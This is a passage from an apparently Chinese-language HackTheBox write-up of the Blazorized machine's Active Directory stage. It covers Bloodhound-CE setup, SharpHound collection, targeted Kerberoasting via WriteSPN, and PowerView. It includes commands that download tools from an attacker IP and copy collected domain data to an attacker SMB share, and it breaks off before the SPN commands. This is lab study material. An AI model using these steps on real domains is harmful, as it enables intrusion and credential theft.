---
title: HackTheBox Blazorized [WriteSPN Kerberoasting + DC session pirvesc + DCSync hash dump + Bloodhound-CE]
url: https://fdlucifer.github.io/2024/11/10/blazorized/
source: 0xfd's blog
date: 2024-11-10
fetch_date: 2025-10-06T19:15:20.619961
---

# HackTheBox Blazorized [WriteSPN Kerberoasting + DC session pirvesc + DCSync hash dump + Bloodhound-CE]

[0xfd's blog](/)

by 0xfd

* [Home](/)
* [About](/about/)
* [Tags41](/tags/)
* [Categories78](/categories/)
* [Archives214](/archives/)
* [Commonweal 404](/404/)
* Search

* Table of Contents
* Overview

1. [1. 简述](#%E7%AE%80%E8%BF%B0)
2. [2. 域渗透部分](#%E5%9F%9F%E6%B8%97%E9%80%8F%E9%83%A8%E5%88%86)
   1. [2.1. bloodhound分析](#bloodhound%E5%88%86%E6%9E%90)
      1. [2.1.1. 安装配置bloodhound](#%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AEbloodhound)
      2. [2.1.2. Collection](#Collection)
      3. [2.1.3. 加载数据](#%E5%8A%A0%E8%BD%BD%E6%95%B0%E6%8D%AE)
      4. [2.1.4. 分析](#%E5%88%86%E6%9E%90)
   2. [2.2. Targeted Kerberoast](#Targeted-Kerberoast)
      1. [2.2.1. 背景](#%E8%83%8C%E6%99%AF)
      2. [2.2.2. Exploit](#Exploit)
      3. [2.2.3. 破解hash](#%E7%A0%B4%E8%A7%A3hash)
   3. [2.3. shell](#shell)
      1. [2.3.1. 验证密码](#%E9%AA%8C%E8%AF%81%E5%AF%86%E7%A0%81)
      2. [2.3.2. Evil-WinRM](#Evil-WinRM)
   4. [2.4. Shell as SSA\_6010](#Shell-as-SSA-6010)
      1. [2.4.1. Groups](#Groups)
      2. [2.4.2. 可写目录](#%E5%8F%AF%E5%86%99%E7%9B%AE%E5%BD%95)
      3. [2.4.3. Users](#Users)
      4. [2.4.4. Logon Script](#Logon-Script)
   5. [2.5. Execution](#Execution)
      1. [2.5.1. Strategy](#Strategy)
      2. [2.5.2. Payload](#Payload)
      3. [2.5.3. Exploit](#Exploit-1)
   6. [2.6. Shell as administrator](#Shell-as-administrator)
      1. [2.6.1. Enumeration](#Enumeration)
      2. [2.6.2. Hash Dump](#Hash-Dump)
      3. [2.6.3. shell](#shell-1)

![253](/images/blackhole.png)

253

All things about infosec & ctf

[214
posts](/archives/)

[78
categories](/categories/)

[41
tags](/tags/)

GitHub

E-Mail

Twitter

FB Page

YouTube

Instagram

infosec.exchange

![Creative Commons](https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg)

0%

Links

* atsud0
* 记忆里的纯真
* 小离

# HackTheBox Blazorized [WriteSPN Kerberoasting + DC session pirvesc + DCSync hash dump + Bloodhound-CE]

Posted on
2024-11-10

In

[WriteSPN Kerberoasting](/categories/WriteSPN-Kerberoasting/)
,
[DC session pirvesc](/categories/WriteSPN-Kerberoasting/DC-session-pirvesc/)
,
[DCSync hash dump](/categories/WriteSPN-Kerberoasting/DC-session-pirvesc/DCSync-hash-dump/)
,
[Bloodhound-CE](/categories/WriteSPN-Kerberoasting/DC-session-pirvesc/DCSync-hash-dump/Bloodhound-CE/)

Views:

Word count in article:
3.2k

Reading time ≈
11 mins.

# 简述

本文是Hard难度的HTB Blazorized机器的域渗透部分，其中WriteSPN Kerberoasting + DC session pirvesc + DCSync hash dump + Bloodhound-CE等域渗透提权细节是此box的特色，主要参考0xdf’s blog Blazorized walkthrough记录这篇博客加深记忆和理解，及供后续做深入研究查阅，备忘。

* ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Blazorized.png)

# 域渗透部分

## bloodhound分析

### 安装配置bloodhound

使用的是较新的Bloodhound-CE，它作为Docker容器运行得非常好。在docker compose中使用curl命令设置它：

|  |  |
| --- | --- |
| ``` 1 ``` | ``` curl -L https://ghst.ly/getbhce | BLOODHOUND_PORT=8888 docker compose -f - up ``` |

这是文档中相同的命令，只是添加了BLOODHOUND\_PORT=8888，因为默认情况下它想在8080上运行web服务器，已经有Burp侦听。

在输出大约50行之后，它会打印出一个随机的临时密码：

* ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Blazorized1.png)

访问localhost:8888，它将显示一个Bloodhound登录屏幕。以用户名admin和给定的密码登录，并在提示时更新。

在下一个窗口中，它显示这个数据库中没有数据（这是预期的，因为还没有收集任何数据）：

* ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Blazorized2.png)

右上方的齿轮图标提供了一个菜单，其中包括”Download Collectors”：

* ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Blazorized3.png)

该页面有SharpHound二进制文件可供下载，下载、解压缩并使用Python web服务器托管SharpHound.exe。

### Collection

只有一个shell，box没有creds，需要用Blazorized上运行的东西来收集bloodhound的数据。已经从上面得到了SharpHound.exe，把它上传到Blazorized并运行：

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 ``` | ``` PS C:\programdata> wget http://10.10.14.6/SharpHound.exe -outfile SharpHound.exe PS C:\programdata> .\SharpHound.exe -c all 2024-11-01T06:09:19.7721017-05:00|INFORMATION|This version of SharpHound is compatible with the 5.0.0 Release of BloodHound 2024-11-01T06:09:20.0220952-05:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, UserRights, CARegistry, DCRegistry, CertServices 2024-11-01T06:09:20.0689718-05:00|INFORMATION|Initializing SharpHound at 6:09 AM on 11/1/2024 2024-11-01T06:09:20.1158490-05:00|INFORMATION|Resolved current domain to blazorized.htb 2024-11-01T06:09:20.2564704-05:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, UserRights, CARegistry, DCRegistry, CertServices 2024-11-01T06:09:20.3970940-05:00|INFORMATION|Beginning LDAP search for blazorized.htb 2024-11-01T06:09:20.5064724-05:00|INFORMATION|Beginning LDAP search for blazorized.htb Configuration NC 2024-11-01T06:09:20.5377221-05:00|INFORMATION|Producer has finished, closing LDAP channel 2024-11-01T06:09:20.5377221-05:00|INFORMATION|LDAP channel closed, waiting for consumers 2024-11-01T06:09:20.5845970-05:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for BLAZORIZED.HTB 2024-11-01T06:09:20.5845970-05:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for BLAZORIZED.HTB 2024-11-01T06:09:20.9283450-05:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for BLAZORIZED.HTB 2024-11-01T06:09:21.4908447-05:00|INFORMATION|Consumers finished, closing output channel Closing writers 2024-11-01T06:09:21.5220984-05:00|INFORMATION|Output channel closed, waiting for output task to complete 2024-11-01T06:09:21.6627215-05:00|INFORMATION|Status: 313 objects finished (+313 313)/s -- Using 37 MB RAM 2024-11-01T06:09:21.6627215-05:00|INFORMATION|Enumeration finished in 00:00:01.2861155 2024-11-01T06:09:21.7877405-05:00|INFORMATION|Saving cache with stats: 20 ID to type mappings.  2 name to SID mappings.  1 machine sid mappings.  4 sid to domain mappings.  0 global catalog mappings. 2024-11-01T06:09:21.8346081-05:00|INFORMATION|SharpHound Enumeration Completed at 6:09 AM on 11/1/2024! Happy Graphing! ``` |

在主机上启动smbserver.py，创建一个名为share的共享：

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 ``` | ``` fdluci@hacky$ smbserver.py share . -smb2support -username fdluci -password fdluci Impacket v0.13.0.dev0+20241024.90011.835e1755 - Copyright Fortra, LLC and its affiliated companies  [*] Config file parsed [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0 [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 [*] Config file parsed [*] Config file parsed ``` |

从Blazorized连接到共享并拷贝zip文件：

|  |  |
| --- | --- |
| ``` 1 2 3 ``` | ``` PS C:\programdata> net use \\10.10.14.6 /u:fdluci fdluci The command completed successfully. PS C:\programdata> copy *.zip \\10.10.14.6\share\ ``` |

### 加载数据

回到Bloodhound网页，在齿轮图标下，点击”Administration”进入”File Ingest”页面。点击”Upload File(s)”，把存档文件给它。

* ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Blazorized4.png)

### 分析

点击”Explore”进入Bloodhound窗口。首先找到拥有的用户nu\_1055，并将它们标记为已拥有。首先看到的是”Outbound Object Control”：

* ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Blazorized5.png)

点击它将RSA\_4810添加到界面中：

* ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Blazorized6.png)

nu\_1055已经通过RSA\_4810用户WriteSPN。

## Targeted Kerberoast

### 背景

服务主体名称（Service Principal Name，SPN）是一个唯一标识符，它将服务实例与Kerberos中的服务帐户关联起来。

Kerberoasting是一种攻击，通过身份验证的用户通过服务的SPN请求服务票证，返回的票证使用与该服务关联的用户的密码进行加密。如果该密码很弱，则可以通过离线暴力破解破解。

为了执行有针对性的kerberoast，为RSA\_4810帐户分配一个SPN。然后可以申请一张ticket作为假服务，并获得一张用RSA\_4810的密码加密的票来破解。

当点击WriteSPN时，在Bloodhound右侧面板的”Windows Abuse”部分给出了从Windows执行此攻击的完整过程：

* ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Blazorized7.png)

### Exploit

需要PowerView来运行上面的命令。把它下载到主机上，用Python作为服务器，然后上传到Blazorized。接下来导入它：

|  |  |
| --- | --- |
| ``` 1 2 3 ``` | ``` wget http://10.10.14.87:88/PowerView.ps1 -outfile PowerView.ps1  PS C:\programdata> . .\PowerView.ps1 ``` |

现在设置用户的SPN：

|  |  |
| --- | --- |
| `...